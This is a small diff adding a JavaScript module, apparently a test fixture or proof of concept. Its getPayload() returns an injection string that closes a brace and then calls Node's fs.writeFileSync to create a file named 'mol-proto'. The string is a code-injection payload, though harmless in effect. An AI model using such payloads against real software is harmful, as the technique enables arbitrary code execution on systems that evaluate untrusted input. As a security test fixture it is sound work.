@@ -1,0 +1,7 @@
+function getPayload() {
+    return {
+        code: "};require('fs').writeFileSync('./mol-proto', '')"
+    };
+}
+
+module.exports = { getPayload };
